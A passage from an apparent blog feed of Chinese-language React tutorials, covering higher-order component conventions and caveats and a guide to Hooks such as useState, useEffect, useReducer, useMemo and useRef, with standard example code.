class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="约定：最大化可组合性"><a href="#约定：最大化可组合性" class="headerlink" title="约定：最大化可组合性"></a>约定：最大化可组合性</h1><p>并不是所有的 HOC 都一样。有时候它仅接受一个参数，也就是被包裹的组件：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> NavbarWithRouter = withRouter(Navbar);</span><br></pre></td></tr></table></figure>
<p>HOC 通常可以接收多个参数。比如在 Relay 中，HOC 额外接收了一个配置对象用于指定组件的数据依赖：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> CommentWithRelay = Relay.createContainer(Comment, config);</span><br></pre></td></tr></table></figure>
<p>最常见的 HOC 签名如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// React Redux 的 `connect` 函数</span></span><br><span class="line"><span class="keyword">const</span> ConnectedComment = connect(commentSelector, commentActions)(CommentList);</span><br></pre></td></tr></table></figure>
<p>刚刚发生了什么？！如果你把它分开，就会更容易看出发生了什么。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// connect 是一个函数，它的返回值为另外一个函数。</span></span><br><span class="line"><span class="keyword">const</span> enhance = connect(commentListSelector, commentListActions);</span><br><span class="line"><span class="comment">// 返回值为 HOC，它会返回已经连接 Redux store 的组件</span></span><br><span class="line"><span class="keyword">const</span> ConnectedComment = enhance(CommentList);</span><br></pre></td></tr></table></figure>
<p>这种形式可能看起来令人困惑或不必要，但它有一个有用的属性。 像 connect 函数返回的单参数 HOC 具有签名 Component =&gt; Component。 输出类型与输入类型相同的函数很容易组合在一起。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 而不是这样...</span></span><br><span class="line"><span class="keyword">const</span> EnhancedComponent = withRouter(connect(commentSelector)(WrappedComponent))</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 你可以编写组合工具函数</span></span><br><span class="line"><span class="comment">// compose(f, g, h) 等同于 (...args) =&gt; f(g(h(...args)))</span></span><br><span class="line"><span class="keyword">const</span> enhance = compose(</span><br><span class="line">  <span class="comment">// 这些都是单参数的 HOC</span></span><br><span class="line">  withRouter,</span><br><span class="line">  connect(commentSelector)</span><br><span class="line">)</span><br><span class="line"><span class="keyword">const</span> EnhancedComponent = enhance(WrappedComponent)</span><br></pre></td></tr></table></figure>
<h1 id="约定：包装显示名称以便轻松调试"><a href="#约定：包装显示名称以便轻松调试" class="headerlink" title="约定：包装显示名称以便轻松调试"></a>约定：包装显示名称以便轻松调试</h1><p>最常见的方式是用 HOC 包住被包装组件的显示名称。比如高阶组件名为 withSubscription，并且被包装组件的显示名称为 CommentList，显示名称应该为 WithSubscription(CommentList)：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withSubscription</span>(<span class="params">WrappedComponent</span>) </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">WithSubscription</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;<span class="comment">/* ... */</span>&#125;</span><br><span class="line">  WithSubscription.displayName = <span class="string">`WithSubscription(<span class="subst">$&#123;getDisplayName(WrappedComponent)&#125;</span>)`</span>;</span><br><span class="line">  <span class="keyword">return</span> WithSubscription;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDisplayName</span>(<span class="params">WrappedComponent</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> WrappedComponent.displayName || WrappedComponent.name || <span class="string">'Component'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="不要在-render-方法中使用-HOC"><a href="#不要在-render-方法中使用-HOC" class="headerlink" title="不要在 render 方法中使用 HOC"></a>不要在 render 方法中使用 HOC</h2><p>React 的 diff 算法（称为协调）使用组件标识来确定它是应该更新现有子树还是将其丢弃并挂载新子树。 如果从 render 返回的组件与前一个渲染中的组件相同（===），则 React 通过将子树与新子树进行区分来递归更新子树。 如果它们不相等，则完全卸载前一个子树。</p>
<p>通常，你不需要考虑这点。但对 HOC 来说这一点很重要，因为这代表着你不应在组件的 render 方法中对一个组件应用 HOC：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">render() &#123;</span><br><span class="line">  <span class="comment">// 每次调用 render 函数都会创建一个新的 EnhancedComponent</span></span><br><span class="line">  <span class="comment">// EnhancedComponent1 !== EnhancedComponent2</span></span><br><span class="line">  <span class="keyword">const</span> EnhancedComponent = enhance(MyComponent);</span><br><span class="line">  <span class="comment">// 这将导致子树每次渲染都会进行卸载，和重新挂载的操作！</span></span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">EnhancedComponent</span> /&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这不仅仅是性能问题 - 重新挂载组件会导致该组件及其所有子组件的状态丢失。</p>
<p>如果在组件之外创建 HOC，这样一来组件只会创建一次。因此，每次 render 时都会是同一个组件。一般来说，这跟你的预期表现是一致的。</p>
<p>在极少数情况下，你需要动态调用 HOC。你可以在组件的生命周期方法或其构造函数中进行调用。</p>
<h1 id="务必复制静态方法"><a href="#务必复制静态方法" class="headerlink" title="务必复制静态方法"></a>务必复制静态方法</h1><p>但是，当你将 HOC 应用于组件时，原始组件将使用容器组件进行包装。这意味着新组件没有原始组件的任何静态方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义静态函数</span></span><br><span class="line">WrappedComponent.staticMethod = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"><span class="comment">// 现在使用 HOC</span></span><br><span class="line"><span class="keyword">const</span> EnhancedComponent = enhance(WrappedComponent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 增强组件没有 staticMethod</span></span><br><span class="line"><span class="keyword">typeof</span> EnhancedComponent.staticMethod === <span class="string">'undefined'</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>为了解决这个问题，你可以在返回之前把这些方法拷贝到容器组件上：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enhance</span>(<span class="params">WrappedComponent</span>) </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Enhance</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="comment">// 必须准确知道应该拷贝哪些方法 :(</span></span><br><span class="line">  Enhance.staticMethod = WrappedComponent.staticMethod;</span><br><span class="line">  <span class="keyword">return</span> Enhance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但要这样做，你需要知道哪些方法应该被拷贝。你可以使用 hoist-non-react-statics 自动拷贝所有非 React 静态方法:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hoistNonReactStatic <span class="keyword">from</span> <span class="string">'hoist-non-react-statics'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enhance</span>(<span class="params">WrappedComponent</span>) </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Enhance</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  hoistNonReactStatic(Enhance, WrappedComponent);</span><br><span class="line">  <span class="keyword">return</span> Enhance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除了导出组件，另一个可行的方案是再额外导出这个静态方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用这种方式代替...</span></span><br><span class="line">MyComponent.someFunction = someFunction;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> MyComponent;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...单独导出该方法...</span></span><br><span class="line"><span class="keyword">export</span> &#123; someFunction &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...并在要使用的组件中，import 它们</span></span><br><span class="line"><span class="keyword">import</span> MyComponent, &#123; someFunction &#125; <span class="keyword">from</span> <span class="string">'./MyComponent.js'</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Refs-不会被传递"><a href="#Refs-不会被传递" class="headerlink" title="Refs 不会被传递"></a>Refs 不会被传递</h2><p>虽然高阶组件的约定是将所有 props 传递给被包装组件，但这对于 refs 并不适用。那是因为 ref 实际上并不是一个 prop - 就像 key 一样，它是由 React 专门处理的。如果将 ref 添加到 HOC 的返回组件中，则 ref 引用指向容器组件，而不是被包装组件。</p>
<p>这个问题的解决方案是通过使用 React.forwardRef API（React 16.3 中引入）。</p>
]]></content>
  </entry>
  <entry>
    <title>react-hooks</title>
    <url>/2020/09/17/react-hooks/</url>
    <content><![CDATA[<h1 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="什么是Hook"><a href="#什么是Hook" class="headerlink" title="什么是Hook?"></a>什么是Hook?</h3><p>Hook是一些可以让你在函数组件里“钩入”React state及生命周期等特性的函数。</p>
<h3 id="使用Hook的原因"><a href="#使用Hook的原因" class="headerlink" title="使用Hook的原因"></a>使用Hook的原因</h3><ol>
<li>在组件之间复用状态逻辑很难<br>React没有提供将可复用性行为“附加”到组件的途经，以前一般是通过render props和高阶组件解决的。这类方案需要重新组织你的组件结构，这可能会很麻烦。</li>
<li>复杂组件变得难以理解<br>组件被状态逻辑和副作用充斥。每个生命周期常常包含一些不相关的逻辑。同一个 componentDidMount中可能也包含很多其它的逻辑，如设置事件监听，而之后需在 componentWillUnmount中清除。相互关联且需要对照修改的代码被进行了拆分，而完全不相关的代码却在同一个方法中组合在一起。<br>Hook 将组件中相互关联的部分拆分成更小的函数（比如设置订阅或请求数据），而并非强制按照生命周期划分。你还可以使用 reducer 来管理组件的内部状态，使其更加可预测。</li>
<li>难以理解的class<br>你必须去理解JavaScript中this的工作方式，这与其他语言存在巨大差异。还不能忘记绑定事件处理器。class也给目前的工具带来了一些问题。例如，class 不能很好的压缩，并且会使热重载出现不稳定的情况。</li>
</ol>
<h2 id="使用State-Hook"><a href="#使用State-Hook" class="headerlink" title="使用State Hook"></a>使用State Hook</h2><h3 id="计数器的例子"><a href="#计数器的例子" class="headerlink" title="计数器的例子"></a>计数器的例子</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;You clicked &#123;count&#125; times&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;</span></span><br><span class="line"><span class="regexp">        Click me</span></span><br><span class="line"><span class="regexp">      &lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>声明了一个叫count的state 变量，然后把它设为0。React会在重复渲染时记住它当前的值，并且提供最新的值给我们的函数。我们可以通过调用setCount来更新当前的count。</p>
<h3 id="使用Effect-Hook"><a href="#使用Effect-Hook" class="headerlink" title="使用Effect Hook"></a>使用Effect Hook</h3><p>Effect Hook可以让你在函数组件中执行副作用操作<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Similar to componentDidMount and componentDidUpdate:</span></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Update the document title using the browser API</span></span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">`You clicked <span class="subst">$&#123;count&#125;</span> times`</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;p&gt;You clicked &#123;count&#125; times&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;</span></span><br><span class="line"><span class="regexp">        Click me</span></span><br><span class="line"><span class="regexp">      &lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>你可以把useEffect Hook看做componentDidMount，componentDidUpdate和 componentWillUnmount这三个函数的组合。</p>
<p>你可能会注意到，传递给useEffect的函数在每次渲染中都可以在effect中获取最新的count的值。每次重新渲染，其实都会生成新的effect，替换掉之前的。某种意义上讲，effect更像是渲染结果的一部分——每个effect“属于”一次特定的渲染。</p>
<p>与componentDidMount或componentDidUpdate 不同，使用useEffect调度的effect不会阻塞浏览器更新屏幕，这让你的应用看起来响应更快。大多数情况下，effect不需要同步地执行。在个别情况下（例如测量布局），有单独的useLayoutEffect Hook供你使用，其API与 useEffect相同。</p>
<h3 id="需要清除的effect"><a href="#需要清除的effect" class="headerlink" title="需要清除的effect"></a>需要清除的effect</h3><p>如果你的effect返回一个函数，React会在组件卸载的时候调用它：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FriendStatus</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [isOnline, setIsOnline] = useState(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handleStatusChange</span>(<span class="params">status</span>) </span>&#123;</span><br><span class="line">      setIsOnline(status.isOnline);</span><br><span class="line">    &#125;</span><br><span class="line">    ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);</span><br><span class="line">    <span class="comment">// Specify how to clean up after this effect:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isOnline === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Loading...'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> isOnline ? <span class="string">'Online'</span> : <span class="string">'Offline'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意，并不是必须为effect中返回的函数命名。其实也可以返回一个箭头函数或者给起一个别的名字。</p>
<h3 id="使用多个Effect实现关注点分离"><a href="#使用多个Effect实现关注点分离" class="headerlink" title="使用多个Effect实现关注点分离"></a>使用多个Effect实现关注点分离</h3><p>你也可以使用多个effect。这会将不相关逻辑分离到不同的effect中：<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FriendStatusWithCounter</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">`You clicked <span class="subst">$&#123;count&#125;</span> times`</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [isOnline, setIsOnline] = useState(<span class="literal">null</span>);</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handleStatusChange</span>(<span class="params">status</span>) </span>&#123;</span><br><span class="line">      setIsOnline(status.isOnline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>React将按照effect声明的顺序依次调用组件中的每一个effect。</p>
<h3 id="通过跳过Effect进行性能优化"><a href="#通过跳过Effect进行性能优化" class="headerlink" title="通过跳过Effect进行性能优化"></a>通过跳过Effect进行性能优化</h3><p>如果某些特定值在两次重渲染之间没有发生变化，你可以通知React跳过对effect的调用，只要传递数组作为useEffect的第二个可选参数即可：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">document</span>.title = <span class="string">`You clicked <span class="subst">$&#123;count&#125;</span> times`</span>;</span><br><span class="line">&#125;, [count]); <span class="comment">// 仅在 count 更改时更新</span></span><br></pre></td></tr></table></figure></p>
<p>如果数组中有多个元素，即使只有一个元素发生变化，React也会执行effect。<br>请确保数组中包含了所有外部作用域中会随时间变化并且在effect中使用的变量。<br>如果想执行只运行一次的effect（仅在组件挂载和卸载时执行），可以传递一个空数组（[]）</p>
<h2 id="Hook规则"><a href="#Hook规则" class="headerlink" title="Hook规则"></a>Hook规则</h2><ol>
<li>只在最顶层使用 Hook，不要在循环，条件或嵌套函数中调用Hook。遵守这条规则，你就能确保Hook在每一次渲染中都按照同样的顺序被调用。这让React能够在多次的useState和 useEffect调用之间保持hook状态的正确。</li>
<li>不要在普通的JavaScript函数中调用Hook<br>你可以：<br>1.在React的函数组件中调用Hook<br>2.在自定义Hook中调用其他Hook<h2 id="自定义Hook"><a href="#自定义Hook" class="headerlink" title="自定义Hook"></a>自定义Hook</h2>自定义Hook是一个函数，其名称以“use”开头，函数内部可以调用其他的Hook。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">useFriendStatus</span>(<span class="params">friendID</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [isOnline, setIsOnline] = useState(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">handleStatusChange</span>(<span class="params">status</span>) </span>&#123;</span><br><span class="line">      setIsOnline(status.isOnline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ChatAPI.subscribeToFriendStatus(friendID, handleStatusChange);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      ChatAPI.unsubscribeFromFriendStatus(friendID, handleStatusChange);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> isOnline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>使用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FriendStatus</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> isOnline = useFriendStatus(props.friend.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isOnline === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Loading...'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> isOnline ? <span class="string">'Online'</span> : <span class="string">'Offline'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FriendListItem</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> isOnline = useFriendStatus(props.friend.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;li style=&#123;&#123; <span class="attr">color</span>: isOnline ? <span class="string">'green'</span> : <span class="string">'black'</span> &#125;&#125;&gt;</span><br><span class="line">      &#123;props.friend.name&#125;</span><br><span class="line">    &lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>自定义Hook是一种自然遵循Hook设计的约定，而并不是React的特性。</p>
<h2 id="Hook-API索引"><a href="#Hook-API索引" class="headerlink" title="Hook API索引"></a>Hook API索引</h2><h3 id="useState补充"><a href="#useState补充" class="headerlink" title="useState补充"></a>useState补充</h3><ol>
<li><p>函数式更新</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">setCount(<span class="function"><span class="params">prevCount</span> =&gt;</span> prevCount - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>惰性初始state<br>如果初始state需要通过复杂计算获得，则可以传入一个函数，在函数中计算并返回初始的 state，此函数只在初始渲染时被调用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [state, setState] = useState(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> initialState = someExpensiveComputation(props);</span><br><span class="line">  <span class="keyword">return</span> initialState;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>跳过state更新<br>调用State Hook的更新函数并传入当前的state时，React将跳过子组件的渲染及effect的执行。（React使用Object.is比较算法来比较state。）</p>
<h3 id="useEffect补充"><a href="#useEffect补充" class="headerlink" title="useEffect补充"></a>useEffect补充</h3><p>effect的执行时机<br>useEffect会在浏览器绘制后延迟执行，但会保证在任何新的渲染前执行。React将在组件更新前刷新上一轮渲染的effect。</p>
<h3 id="useContext"><a href="#useContext" class="headerlink" title="useContext"></a>useContext</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> value = useContext(MyContext);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>接收一个context对象（React.createContext的返回值）并返回该context的当前值。当前的context值由上层组件中距离当前组件最近的 <code>&lt;MyContext.Provider&gt;</code> 的value prop 决定。</p>
<p>当组件上层最近的<code>&lt;MyContext.Provider&gt;</code>更新时，该Hook会触发重渲染，并使用最新传递给MyContext provider的context value值。即使祖先使用React.memo或shouldComponentUpdate，也会在组件本身使用useContext时重新渲染。</p>
<h3 id="useReducer"><a href="#useReducer" class="headerlink" title="useReducer"></a>useReducer</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [state, dispatch] = useReducer(reducer, initialArg, init);</span><br></pre></td></tr></table></figure>
<p>以下是用reducer重写useState一节的计数器示例：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> initialState = &#123;<span class="attr">count</span>: <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span>(<span class="params">state, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'increment'</span>:</span><br><span class="line">      <span class="keyword">return</span> &#123;<span class="attr">count</span>: state.count + <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'decrement'</span>:</span><br><span class="line">      <span class="keyword">return</span> &#123;<span class="attr">count</span>: state.count - <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Counter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [state, dispatch] = useReducer(reducer, initialState);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      Count: &#123;state.count&#125;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; dispatch(&#123;<span class="attr">type</span>: <span class="string">'decrement'</span>&#125;)&#125;&gt;-&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: 'increment'&#125;)&#125;&gt;+&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="惰性初始化"><a href="#惰性初始化" class="headerlink" title="惰性初始化"></a>惰性初始化</h3><p>你可以选择惰性地创建初始state。为此，需要将init函数作为useReducer的第三个参数传入，这样初始state将被设置为init(initialArg)。</p>
<h3 id="跳过dispatch"><a href="#跳过dispatch" class="headerlink" title="跳过dispatch"></a>跳过dispatch</h3><p>如果Reducer Hook的返回值与当前state相同，React将跳过子组件的渲染及副作用的执行。（React使用Object.is比较算法来比较state。）</p>
<h2 id="useCallback"><a href="#useCallback" class="headerlink" title="useCallback"></a>useCallback</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> memoizedCallback = useCallback(</span><br><span class="line">  () =&gt; &#123;</span><br><span class="line">    doSomething(a, b);</span><br><span class="line">  &#125;,</span><br><span class="line">  [a, b],</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>把内联回调函数及依赖项数组作为参数传入useCallback，它将返回该回调函数的memoized版本，该回调函数仅在某个依赖项改变时才会更新。当你把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如shouldComponentUpdate）的子组件时，它将非常有用。</p>
<p>useCallback(fn, deps)相当于useMemo(() =&gt; fn, deps)。</p>
<h2 id="useMemo"><a href="#useMemo" class="headerlink" title="useMemo"></a>useMemo</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> memoizedValue = useMemo(<span class="function"><span class="params">()</span> =&gt;</span> computeExpensiveValue(a, b), [a, b]);</span><br></pre></td></tr></table></figure>
<p>把“创建”函数和依赖项数组作为参数传入useMemo，它仅会在某个依赖项改变时才重新计算 memoized值。这种优化有助于避免在每次渲染时都进行高开销的计算。</p>
<h2 id="useRef"><a href="#useRef" class="headerlink" title="useRef"></a>useRef</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> refContainer = useRef(initialValue);</span><br></pre></td></tr></table></figure>
<p>useRef 返回一个可变的ref对象，其.current 属性被初始化为传入的参数（initialValue）。返回的ref对象在组件的整个生命周期内保持不变。</p>
<p>一个常见的用例便是命令式地访问子组件：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TextInputWithFocusButton</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> inputEl = useRef(<span class="literal">null</span>);</span><br><span class="line">  <span class="keyword">const</span> onButtonClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// `current` 指向已挂载到 DOM 上的文本输入元素</span></span><br><span class="line">    inputEl.current.focus();</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;&gt;</span><br><span class="line">      &lt;input ref=&#123;inputEl&#125; type=<span class="string">"text"</span> /&gt;</span><br><span class="line">      &lt;button onClick=&#123;onButtonClick&#125;&gt;Focus the input&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>请记住，当 ref 对象内容发生变化时，useRef 并不会通知你。变更 .current 属性不会引发组件重新渲染。如果想要在 React 绑定或解绑 DOM 节点的 ref 时运行某些代码，则需要使用回调 ref 来实现。</p>
<h2 id="useImperativeHandle"><a href="#useImperativeHandle" class="headerlink" title="useImperativeHandle"></a>useImperativeHandle</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">useImperativeHandle(ref, createHandle, [deps])</span><br></pre></td></tr></table></figure>
